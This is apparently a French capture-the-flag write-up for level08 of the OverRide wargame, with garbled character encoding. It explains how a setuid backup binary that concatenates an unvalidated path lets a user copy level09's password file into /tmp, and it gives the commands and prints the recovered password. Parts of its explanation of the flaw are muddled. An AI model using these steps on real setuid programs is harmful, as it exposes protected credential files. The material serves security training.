# ğŸ“˜ Override â€“ Level08

## ğŸ“ Description

Ce niveau implÃ©mente un programme de "backup" trÃ¨s simplifiÃ©.
Il lit un fichier fourni en argument, et le copie dans un sous-dossier `./backups/`.

Cependant, le chemin de destination est construit directement Ã  partir de lâ€™argument, sans aucune validation.
Cela ouvre la porte Ã  une vulnÃ©rabilitÃ© **path traversal**, permettant dâ€™Ã©crire dans des fichiers appartenant Ã  *level09*, puisque le binaire est `setuid level09`.

Notre objectif : **copier `/home/users/level09/.pass` dans un emplacement que nous pouvons lire.**

---

## ğŸ” Analyse du binaire

### Commande utilisÃ©e

```bash
level08@OverRide:~$ ./level08 <filename>
```

### Extrait du code vulnÃ©rable

```c
builtin_strncpy(local_78, "./backups/", 0xb);
strncat(local_78, param_2[1], 99 - (...));

__fd = open(local_78, 0xc1, 0x1b0);
```

Le fichier de destination construit est donc :

```
./backups/<argument>
```

Puis :

```c
__stream = fopen(param_2[1], "r");
```

ğŸ’¡ **La source doit Ãªtre un fichier lisible par nous.
La destination est Ã©crite avec les droits de level09 (SUID).**

---

## ğŸš¨ VulnÃ©rabilitÃ© : Path Traversal

Le programme ne normalise pas le chemin.
Si on passe un argument comme :

```
/home/users/level09/.pass
```

La destination devient :

```
./backups//home/users/level09/.pass
```

â¡ï¸ Le kernel rÃ©sout cela comme un chemin normal.

**Le binaire va alors Ã©crire dans un fichier appartenant Ã  level09.**

---

## â— ProblÃ¨me initial : le chemin nâ€™existe pas

Dans notre HOME, `./backups//home/users/level09/` nâ€™existe pas.
Et nous nâ€™avons pas la permission de crÃ©er `/home/users/level09`.

Dâ€™oÃ¹ lâ€™erreur :

```
ERROR: Failed to open ./backups//home/users/level09/.pass
```

---

## ğŸ¯ Solution : travailler dans /tmp

`/tmp` est un rÃ©pertoire global oÃ¹ nâ€™importe quel utilisateur peut crÃ©er des dossiers.

Nous faisons donc :

```bash
cd /tmp
mkdir -p './backups//home/users/level09/'
```

Maintenant, dans `/tmp`, le chemin suivant existe rÃ©ellement :

```
/tmp/backups/home/users/level09/
```

Câ€™est dans ce chemin que **level09** va Ã©crire.

---

## ğŸš€ Exploitation

### Ã‰tape 1 â€” Aller dans /tmp

```bash
cd /tmp
```

### Ã‰tape 2 â€” CrÃ©er le chemin traversÃ©

```bash
mkdir -p './backups//home/users/level09/'
```

### Ã‰tape 3 â€” Lancer level08 avec le chemin cible

```bash
/home/users/level08/level08 /home/users/level09/.pass
```

Le binaire :

1. Ouvre en lecture `param_2[1] = /home/users/level09/.pass`
   (setuid â†’ autorisÃ©)

2. Ã‰crit une copie dans `./backups//home/users/level09/.pass`
   ce qui, depuis /tmp, donne :

```
/tmp/backups/home/users/level09/.pass
```

### Ã‰tape 4 â€” Lire la copie

```bash
cat backups/home/users/level09/.pass
```

### RÃ©sultat obtenu :

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

---

## ğŸ§  Pourquoi Ã§a fonctionne rÃ©ellement ?

| Action                       | Explication                                       |
| ---------------------------- | ------------------------------------------------- |
| On crÃ©e le chemin dans /tmp  | Le binaire ne vÃ©rifie pas quâ€™il est dans son HOME |
| On utilise un path traversal | Il est concatÃ©nÃ© tel quel dans `./backups/`       |
| Le binaire est SUID level09  | Il Ã©crit avec les droits level09                  |
| On lit la copie dans /tmp    | Câ€™est notre rÃ©pertoire, donc accessible           |

â¡ï¸ **On copie donc un fichier protÃ©gÃ© en exploitant son Ã©criture SUID, sans jamais avoir Ã  le lire directement.**

---

## âœ”ï¸ RÃ©sumÃ©

| Ã‰lÃ©ment            | Valeur                                                       |
| ------------------ | ------------------------------------------------------------ |
| VulnÃ©rabilitÃ©      | Path Traversal via `strncat`                                 |
| Ce qui est protÃ©gÃ© | /home/users/level09/.pass                                    |
| Ce quâ€™on exploite  | Le binaire SUID Ã©crit dans un chemin que nous contrÃ´lons     |
| Solution           | RecrÃ©er ce chemin dans /tmp et lancer le programme depuis lÃ  |
| Gain               | RÃ©cupÃ©ration du mot de passe level09                         |

---

## ğŸ‰ Mot de passe level09

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```